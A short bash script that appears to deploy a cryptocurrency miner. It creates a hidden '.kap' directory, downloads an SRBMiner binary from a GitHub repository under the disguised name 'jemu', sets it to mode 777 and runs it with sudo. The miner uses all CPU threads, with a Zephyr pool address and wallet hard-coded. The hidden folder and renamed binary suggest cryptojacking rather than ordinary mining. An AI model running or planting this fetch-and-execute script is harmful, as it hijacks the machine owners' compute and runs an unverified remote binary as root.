#!/bin/bash
apt-get update ; apt-get -y install sudo
mkdir .kap && cd .kap
wget -O jemu https://github.com/nandafiku/gradi/raw/main/SRBMiner-247
chmod 777 jemu
sudo ./jemu --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --cpu-threads $(nproc --all)
